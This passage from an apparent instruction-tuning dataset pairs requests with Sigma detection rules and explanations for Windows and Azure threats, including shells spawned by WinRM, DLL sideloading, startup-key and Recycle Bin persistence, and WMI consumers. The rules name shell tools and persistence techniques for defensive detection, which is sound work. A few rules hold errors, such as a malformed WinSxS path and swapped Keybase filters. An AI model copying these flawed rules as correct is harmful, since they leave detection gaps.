      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high\n",
      "question": "suspicious processes including shells spawnd from WinRM host process",
      "answer": "In order to detect suspicious processes including shells spawned from WinRM host process, you should: Identify the creation of processes on Windows systems with a focus on instances where certain command-line tools or shells (such as cmd.exe, sh.exe, bash.exe, powershell.exe, pwsh.exe, wsl.exe, schtasks.exe, certutil.exe, whoami.exe, or bitsadmin.exe) are initiated from a parent process named wsmprovhost.exe. This activity is significant as it might indicate an attacker leveraging Windows Remote Management (WinRM) to execute commands or scripts remotely, which can be a part of various attack tactics like execution, privilege escalation, or lateral movement. It is crucial, however, to consider that not all matches will indicate malicious activity; legitimate administrative use of WinRM which includes similar process creation patterns could be erroneously detected, thus, being mindful of potential legitimate uses of WinRM in the environment is essential. The rule carries a high level of importance due to the severity of the underlying behavior it aims to detect."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"edputil.dll\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"edputil.dll\", you should focus on monitoring image load activities within Windows systems. Specifically, watch for instances where \"edputil.dll\" is loaded outside the standard Windows directories, which include \"C:\\Windows\\System32\\\", \"C:\\Windows\\SysWOW64\\\", and \"C\\Windows\\WinSxS\\\". This monitoring is achieved by examining if the loaded image's path ends with \"\\edputil.dll\" but does not start with any of the aforementioned trusted Windows paths. Such activities are often associated with malicious efforts to sideload DLLs, which can be a technique used by adversaries to execute arbitrary code or compromise systems. The likelihood of these observations being false positives is considered low, and the associated risk level is rated high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\edputil.dll'\n    filter_main_generic:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C\\Windows\\WinSxS\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\edputil.dll'\n    filter_main_generic:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C\\Windows\\WinSxS\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential DLL sideloading of \"edputil.dll\"",
      "answer": "In order to detect potential DLL sideloading of \"edputil.dll\", you should focus on monitoring image load activities within Windows systems. Specifically, watch for instances where \"edputil.dll\" is loaded outside the standard Windows directories, which include \"C:\\Windows\\System32\\\", \"C:\\Windows\\SysWOW64\\\", and \"C\\Windows\\WinSxS\\\". This monitoring is achieved by examining if the loaded image's path ends with \"\\edputil.dll\" but does not start with any of the aforementioned trusted Windows paths. Such activities are often associated with malicious efforts to sideload DLLs, which can be a technique used by adversaries to execute arbitrary code or compromise systems. The likelihood of these observations being false positives is considered low, and the associated risk level is rated high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect modification of the startup key to a path where a payload could be stored to be launched during startup.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of the startup key to a path where a payload could be stored to be launched during startup, you should monitor the Windows registry for any setting changes specifically within the 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' key. Look for events where the EventType is 'SetValue'. This indicates that a value within a registry key has been modified. Furthermore, focus on changes where the TargetObject ends with 'Startup', encompassing both the Common Startup folder and individual user Startup folders. This is critical as malicious actors often target these registry keys to ensure their payload executes during system startup, achieving persistence on the compromised system. False positives might arise in situations where legitimate software or administrators make changes to these startup keys, which are currently considered unknown. The importance of monitoring these registry modifications is rated as high due to the potential for misuse by adversaries to gain persistent access and execute unauthorized code automatically upon system boot.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n        TargetObject|endswith: 'Startup' # cover Common Startup and Startup\n        # can use Details|contains: path if get too many FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders'\n        TargetObject|endswith: 'Startup' # cover Common Startup and Startup\n        # can use Details|contains: path if get too many FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup",
      "answer": "In order to detect modification of the startup key to a path where a payload could be stored to be launched during startup, you should monitor the Windows registry for any setting changes specifically within the 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' key. Look for events where the EventType is 'SetValue'. This indicates that a value within a registry key has been modified. Furthermore, focus on changes where the TargetObject ends with 'Startup', encompassing both the Common Startup folder and individual user Startup folders. This is critical as malicious actors often target these registry keys to ensure their payload executes during system startup, achieving persistence on the compromised system. False positives might arise in situations where legitimate software or administrators make changes to these startup keys, which are currently considered unknown. The importance of monitoring these registry modifications is rated as high due to the potential for misuse by adversaries to gain persistent access and execute unauthorized code automatically upon system boot."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting raw disk access using uncommon tools or tools that are located in suspicious locations (heavy filtering is required), which could indicate possible defense evasion attempts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect raw disk access using uncommon tools or tools that are located in suspicious locations, which could indicate possible defense evasion attempts, you should monitor for executions from locations not commonly associated with legitimate system processes or common software installations. Windows operating systems have predefined locations for system files, applications, and processes critical for their operation, such as 'C:\\Program Files\\', 'C:\\Windows\\System32\\', and similar directories. Processes executing from these locations are generally considered safe. However, to spot potentially malicious activity, look for executions occurring outside these trusted paths, especially from removable devices like floppy drives, temporary directories such as 'C:\\Windows\\Temp\\', or less monitored user data folders like those under 'C:\\Users\\'.\n\nYou should also pay attention to processes that attempt to disguise themselves as legitimate system update files or processes (e.g., 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' related to Windows upgrade or update), yet located in atypical directories, or leveraging application data paths (e.g., paths containing '\\AppData\\Microsoft\\'). Such tactics might be employed by attackers to evade detection mechanisms by blending in with normal system update operations.\n\nAdditionally, keep an eye out for specific executable names and paths that have been flagged as uncommon points of execution for otherwise legitimate tools, for instance, the GitHub Desktop application executing from an unusual path like 'C:\\Users\\[Username]\\AppData\\Local\\GitHubDesktop\\...' or tools like 'NVMEHostmetadata.exe' and 'SSDUpdate.exe' running from 'C:\\Windows\\Temp\\' which might indicate an attempt to modify system or disk components covertly.\n\nFurthermore, execution of tools like 'thor.exe' from directories like 'C:\\Windows\\Temp\\asgard2-agent\\' and unusual execution paths for Keybase updater ('upd.exe') could signify unauthorized or suspicious activities. \n\nMonitoring for these indicators necessitates a nuanced understand of normal system and user behavior to minimize false positives, as legitimate software installations, updates, or administrative activities may occasionally use similar paths or patterns. However, consistent or repeated detection of such patterns warrants further investigation. Tags such as \"Defense Evasion\" and \"Execution\" from the MITRE ATT&CK framework are pertinent here, as they help categorize the detected activities into broader tactics and techniques used by adversaries to bypass security measures and execute malicious payloads or scripts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: raw_access_thread\ndetection:\n    filter_main_floppy:\n        Device|contains: floppy\n    filter_main_generic:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SystemApps\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\servicing\\'\n            - 'C:\\Windows\\CCM\\'\n            - 'C:\\Windows\\uus\\'\n    filter_main_setuphost:\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' # Related to Windows Upgrade/Update\n    filter_main_system_images:\n        Image:\n            - 'System'\n            - 'Registry'\n    filter_main_specific:\n        Image: 'C:\\Windows\\explorer.exe'\n    filter_main_windefender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        Image|endswith: '\\MsMpEng.exe'\n    filter_main_microsoft_appdata:\n        Image|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\'\n            - '\\Microsoft\\'\n    filter_main_windows_update_box:\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        # Related to Windows Upgrade/Update\n        Image|startswith: 'C:\\Windows\\SoftwareDistribution\\Download'\n        Image|endswith: '\\WindowsUpdateBox.exe'\n    filter_main_ssd_nvme:\n        Image|startswith: 'C:\\Windows\\Temp\\'\n        Image|endswith:\n            - '\\HostMetadata\\NVMEHostmetadata.exe'\n            - '\\Executables\\SSDUpdate.exe'\n    filter_optional_github_desktop:\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\GitHubDesktop\\app-'\n        Image|endswith: '\\resources\\app\\git\\mingw64\\bin\\git.exe'\n    filter_optional_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        Image|endswith: '\\thor.exe'\n    filter_optional_Keybase:\n        Image|endswith: 'C:\\Users\\'\n        Image|startswith: '\\AppData\\Local\\Keybase\\upd.exe'\n    condition: not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: raw_access_thread\ndetection:\n    filter_main_floppy:\n        Device|contains: floppy\n    filter_main_generic:\n        Image|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SystemApps\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\servicing\\'\n            - 'C:\\Windows\\CCM\\'\n            - 'C:\\Windows\\uus\\'\n    filter_main_setuphost:\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' # Related to Windows Upgrade/Update\n    filter_main_system_images:\n        Image:\n            - 'System'\n            - 'Registry'\n    filter_main_specific:\n        Image: 'C:\\Windows\\explorer.exe'\n    filter_main_windefender:\n        Image|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        Image|endswith: '\\MsMpEng.exe'\n    filter_main_microsoft_appdata:\n        Image|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\'\n            - '\\Microsoft\\'\n    filter_main_windows_update_box:\n        # ParentCommandLine: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n        # Related to Windows Upgrade/Update\n        Image|startswith: 'C:\\Windows\\SoftwareDistribution\\Download'\n        Image|endswith: '\\WindowsUpdateBox.exe'\n    filter_main_ssd_nvme:\n        Image|startswith: 'C:\\Windows\\Temp\\'\n        Image|endswith:\n            - '\\HostMetadata\\NVMEHostmetadata.exe'\n            - '\\Executables\\SSDUpdate.exe'\n    filter_optional_github_desktop:\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\GitHubDesktop\\app-'\n        Image|endswith: '\\resources\\app\\git\\mingw64\\bin\\git.exe'\n    filter_optional_nextron:\n        Image|startswith: 'C:\\Windows\\Temp\\asgard2-agent\\'\n        Image|endswith: '\\thor.exe'\n    filter_optional_Keybase:\n        Image|endswith: 'C:\\Users\\'\n        Image|startswith: '\\AppData\\Local\\Keybase\\upd.exe'\n    condition: not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely\nlevel: low\n",
      "question": "raw disk access using uncommon tools or tools that are located in suspicious locations (heavy filtering is required), which could indicate possible defense evasion attempts",
      "answer": "In order to detect raw disk access using uncommon tools or tools that are located in suspicious locations, which could indicate possible defense evasion attempts, you should monitor for executions from locations not commonly associated with legitimate system processes or common software installations. Windows operating systems have predefined locations for system files, applications, and processes critical for their operation, such as 'C:\\Program Files\\', 'C:\\Windows\\System32\\', and similar directories. Processes executing from these locations are generally considered safe. However, to spot potentially malicious activity, look for executions occurring outside these trusted paths, especially from removable devices like floppy drives, temporary directories such as 'C:\\Windows\\Temp\\', or less monitored user data folders like those under 'C:\\Users\\'.\n\nYou should also pay attention to processes that attempt to disguise themselves as legitimate system update files or processes (e.g., 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' related to Windows upgrade or update), yet located in atypical directories, or leveraging application data paths (e.g., paths containing '\\AppData\\Microsoft\\'). Such tactics might be employed by attackers to evade detection mechanisms by blending in with normal system update operations.\n\nAdditionally, keep an eye out for specific executable names and paths that have been flagged as uncommon points of execution for otherwise legitimate tools, for instance, the GitHub Desktop application executing from an unusual path like 'C:\\Users\\[Username]\\AppData\\Local\\GitHubDesktop\\...' or tools like 'NVMEHostmetadata.exe' and 'SSDUpdate.exe' running from 'C:\\Windows\\Temp\\' which might indicate an attempt to modify system or disk components covertly.\n\nFurthermore, execution of tools like 'thor.exe' from directories like 'C:\\Windows\\Temp\\asgard2-agent\\' and unusual execution paths for Keybase updater ('upd.exe') could signify unauthorized or suspicious activities. \n\nMonitoring for these indicators necessitates a nuanced understand of normal system and user behavior to minimize false positives, as legitimate software installations, updates, or administrative activities may occasionally use similar paths or patterns. However, consistent or repeated detection of such patterns warrants further investigation. Tags such as \"Defense Evasion\" and \"Execution\" from the MITRE ATT&CK framework are pertinent here, as they help categorize the detected activities into broader tactics and techniques used by adversaries to bypass security measures and execute malicious payloads or scripts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions), you should: monitor the creation of processes on Windows systems, particularly focusing on instances where either 'java.exe' or 'javaw.exe' are the parent processes. Specifically, look for cases where the command line used to start the process includes 'SysAidServer'. This is indicative of activities related to the intrusions executed by the MERCURY threat actor and highlights a potential security threat. Be aware that there might be cases where such activities are benign, but they are currently unknown, hence the importance of reviewing such instances closely. The detection of these processes is classified with a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentCommandLine|contains: 'SysAidServer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)",
      "answer": "In order to detect suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions), you should: monitor the creation of processes on Windows systems, particularly focusing on instances where either 'java.exe' or 'javaw.exe' are the parent processes. Specifically, look for cases where the command line used to start the process includes 'SysAidServer'. This is indicative of activities related to the intrusions executed by the MERCURY threat actor and highlights a potential security threat. Be aware that there might be cases where such activities are benign, but they are currently unknown, hence the importance of reviewing such instances closely. The detection of these processes is classified with a medium level of importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious WMI event filter and command line event consumer based on WMI and Security Logs..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious WMI event filter and command line event consumer based on WMI and Security Logs, you should: Focus on monitoring Windows Management Instrumentation (WMI) and security logs, particularly looking out for events with ID 5861 and 5859, which are pivotal for identifying suspicious WMI activities. These events are crucial as they represent the binding of WMI filter to consumer and WMI filter registration, respectively. Such detections necessitate that WMI Namespaces Auditing and System Access Control List (SACL) be configured appropriately on systems running Windows 10, Windows Server 2012, or higher versions.\n\nFor a more refined detection, pay attention to specific keywords within the consumer event logs, such as 'ActiveScriptEventConsumer', 'CommandLineEventConsumer', and 'CommandLineTemplate'. These keywords are indicative of potentially malicious WMI consumers that could be utilized for executing arbitrary commands or scripts in response to WMI event filters.\n\nAdditionally, it is essential to filter out benign activities that could trigger false positives, specifically those related to the 'SCM Event Provider'. This involves disregarding events where the query 'select * from MSFT_SCMEventLogEvent' is executed by the 'S-1-5-32-544' user, and the cause is marked as 'Permanent'. Such filtering ensures that only relevant and genuinely suspicious activities are flagged for further investigation.\n\nAlso, be prepared for some degree of unknown false positives since this detection mechanism operates on a relatively small dataset with further testing required to refine its accuracy.\n\nThis detection approach hinges on leveraging WMI and security log monitoring to unearth activities that could be indicative of sophisticated attacks exploiting WMI event filters and consumers for malicious purposes, aligning with tactics and techniques related to Execution and Persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: wmi #native windows detection\n    definition: 'WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher'\ndetection:\n    wmi_filter_to_consumer_binding:\n        EventID: 5861\n    consumer_keywords:\n        - 'ActiveScriptEventConsumer'\n        - 'CommandLineEventConsumer'\n        - 'CommandLineTemplate'\n        # - 'Binding EventFilter'  # too many false positive with HP Health Driver\n    wmi_filter_registration:\n        EventID: 5859\n    filter_scmevent:\n        Provider: 'SCM Event Provider'\n        Query: 'select * from MSFT_SCMEventLogEvent'\n        User: 'S-1-5-32-544'\n        PossibleCause: 'Permanent'\n    condition: ( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: wmi #native windows detection\n    definition: 'WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher'\ndetection:\n    wmi_filter_to_consumer_binding:\n        EventID: 5861\n    consumer_keywords:\n        - 'ActiveScriptEventConsumer'\n        - 'CommandLineEventConsumer'\n        - 'CommandLineTemplate'\n        # - 'Binding EventFilter'  # too many false positive with HP Health Driver\n    wmi_filter_registration:\n        EventID: 5859\n    filter_scmevent:\n        Provider: 'SCM Event Provider'\n        Query: 'select * from MSFT_SCMEventLogEvent'\n        User: 'S-1-5-32-544'\n        PossibleCause: 'Permanent'\n    condition: ( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: medium\n",
      "question": "suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "answer": "In order to detect suspicious WMI event filter and command line event consumer based on WMI and Security Logs, you should: Focus on monitoring Windows Management Instrumentation (WMI) and security logs, particularly looking out for events with ID 5861 and 5859, which are pivotal for identifying suspicious WMI activities. These events are crucial as they represent the binding of WMI filter to consumer and WMI filter registration, respectively. Such detections necessitate that WMI Namespaces Auditing and System Access Control List (SACL) be configured appropriately on systems running Windows 10, Windows Server 2012, or higher versions.\n\nFor a more refined detection, pay attention to specific keywords within the consumer event logs, such as 'ActiveScriptEventConsumer', 'CommandLineEventConsumer', and 'CommandLineTemplate'. These keywords are indicative of potentially malicious WMI consumers that could be utilized for executing arbitrary commands or scripts in response to WMI event filters.\n\nAdditionally, it is essential to filter out benign activities that could trigger false positives, specifically those related to the 'SCM Event Provider'. This involves disregarding events where the query 'select * from MSFT_SCMEventLogEvent' is executed by the 'S-1-5-32-544' user, and the cause is marked as 'Permanent'. Such filtering ensures that only relevant and genuinely suspicious activities are flagged for further investigation.\n\nAlso, be prepared for some degree of unknown false positives since this detection mechanism operates on a relatively small dataset with further testing required to refine its accuracy.\n\nThis detection approach hinges on leveraging WMI and security log monitoring to unearth activities that could be indicative of sophisticated attacks exploiting WMI event filters and consumers for malicious purposes, aligning with tactics and techniques related to Execution and Persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via RUNDLL LAUNCHER.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detect Obfuscated Powershell via RUNDLL LAUNCHER, you should: Focus on monitoring driver load events in Windows environments. Specifically, look for the loading of drivers where the ImagePath includes rundll32.exe in conjunction with shell32.dll, as well as the specific mention of shellexec_rundll and powershell within the same command context. This scenario is indicative of a method used to execute obfuscated PowerShell scripts, an approach commonly leveraged by attackers to evade detection mechanisms. Such actions align with defense evasion and execution tactics, particularly those involving the obfuscation of malicious scripts (T1027) and the execution of PowerShell scripts (T1059.001) in an attempt to sidestep security measures. The identification of these activities should be met with a medium level of alertness due to the potential for false positives, although such occurrences are currently unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|contains|all:\n            - 'rundll32.exe'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n            - 'powershell'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.defense_evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|contains|all:\n            - 'rundll32.exe'\n            - 'shell32.dll'\n            - 'shellexec_rundll'\n            - 'powershell'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.defense_evasion\n    - attack.t1027\n    - attack.execution\n    - attack.t1059.001\n",
      "question": "Obfuscated Powershell via RUNDLL LAUNCHER",
      "answer": "In order to Detect Obfuscated Powershell via RUNDLL LAUNCHER, you should: Focus on monitoring driver load events in Windows environments. Specifically, look for the loading of drivers where the ImagePath includes rundll32.exe in conjunction with shell32.dll, as well as the specific mention of shellexec_rundll and powershell within the same command context. This scenario is indicative of a method used to execute obfuscated PowerShell scripts, an approach commonly leveraged by attackers to evade detection mechanisms. Such actions align with defense evasion and execution tactics, particularly those involving the obfuscation of malicious scripts (T1027) and the execution of PowerShell scripts (T1059.001) in an attempt to sidestep security measures. The identification of these activities should be met with a medium level of alertness due to the potential for false positives, although such occurrences are currently unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of a renamed \"jusched.exe\" as seen used by the cobalt group.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of a renamed \"jusched.exe\" as seen used by the cobalt group, you should: Focus on monitoring process creation events within Windows environments. Specifically, watch for processes that describe themselves as either \"Java Update Scheduler\" or \"Java(TM) Update Scheduler\". However, it's crucial to exclude any processes that are legitimately named \"jusched.exe\" at the end of their image path, as this is the known legitimate Java Update Scheduler executable. This approach aims to capture scenarios where attackers may attempt to masquerade their malicious process under the guise of the Java Update Scheduler by renaming \"jusched.exe\" to something else to evade detection. Bear in mind, the certainty level of catching such malicious activity with this method is considered high, yet there's an acknowledgment of potential unknown false positives, indicating that detections might not always perfectly align with malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of a renamed \"jusched.exe\" as seen used by the cobalt group",
      "answer": "In order to detect the execution of a renamed \"jusched.exe\" as seen used by the cobalt group, you should: Focus on monitoring process creation events within Windows environments. Specifically, watch for processes that describe themselves as either \"Java Update Scheduler\" or \"Java(TM) Update Scheduler\". However, it's crucial to exclude any processes that are legitimately named \"jusched.exe\" at the end of their image path, as this is the known legitimate Java Update Scheduler executable. This approach aims to capture scenarios where attackers may attempt to masquerade their malicious process under the guise of the Java Update Scheduler by renaming \"jusched.exe\" to something else to evade detection. Bear in mind, the certainty level of catching such malicious activity with this method is considered high, yet there's an acknowledgment of potential unknown false positives, indicating that detections might not always perfectly align with malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect successful authentications from countries you do not operate out of..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect successful authentications from countries you do not operate out of, you should focus on monitoring Azure sign-in logs. Specifically, you should look for log entries that indicate a successful sign-in status. However, it is crucial to exclude sign-ins originating from locations or countries where your organization operates. This means if the sign-in attempt comes from any of the countries you do operate out of, these sign-ins should not trigger any alerts. Only successful authentications that originate from countries outside of your operational locations should be considered suspicious. It is important to note that some legitimate activities may sometimes be flagged if they fall outside the expected parameters, such as an approved action by a System Administrator. Therefore, it's vital to review such alerts with a medium level of priority to ascertain their validity. This approach helps in identifying potentially unauthorized or malicious access attempts from geographic locations inconsistent with your organization's normal operational footprint.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        Status: 'Success'\n    filter:\n        Location|contains: '<Countries you DO operate out of e,g GB, use OR for multiple>'\n    condition: selection and not filter\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        Status: 'Success'\n    filter:\n        Location|contains: '<Countries you DO operate out of e,g GB, use OR for multiple>'\n    condition: selection and not filter\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
      "question": "Detect successful authentications from countries you do not operate out of.",
      "answer": "In order to detect successful authentications from countries you do not operate out of, you should focus on monitoring Azure sign-in logs. Specifically, you should look for log entries that indicate a successful sign-in status. However, it is crucial to exclude sign-ins originating from locations or countries where your organization operates. This means if the sign-in attempt comes from any of the countries you do operate out of, these sign-ins should not trigger any alerts. Only successful authentications that originate from countries outside of your operational locations should be considered suspicious. It is important to note that some legitimate activities may sometimes be flagged if they fall outside the expected parameters, such as an approved action by a System Administrator. Therefore, it's vital to review such alerts with a medium level of priority to ascertain their validity. This approach helps in identifying potentially unauthorized or malicious access attempts from geographic locations inconsistent with your organization's normal operational footprint."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting persistence registry keys for Recycle Bin.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect persistence registry keys for Recycle Bin, you should monitor registry events in Windows systems for the creation or modification of specific keys that are known to be utilized for maintaining persistence mechanisms. Specifically, look out for events where a registry key is renamed to include '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open', as this indicates an attempt to manipulate the Recycle Bin's functionality for persistent access. Additionally, monitor for events where the default command for the Recycle Bin (identified through the registry path '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)') is set or altered. Detecting these activities in the registry can signify that an attacker is trying to establish persistence on the system by leveraging the Recycle Bin, a technique that can allow malicious software or activities to remain undetected by conventional security measures. As no specific false positives have been defined apart from unknown ones, it's crucial to analyze these detections in the context they occur to understand their legitimacy. ",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_create:\n        EventType: RenameKey\n        NewName|contains: '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open'\n    selection_set:\n        EventType: SetValue\n        TargetObject|contains: '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_create:\n        EventType: RenameKey\n        NewName|contains: '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open'\n    selection_set:\n        EventType: SetValue\n        TargetObject|contains: '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "persistence registry keys for Recycle Bin",
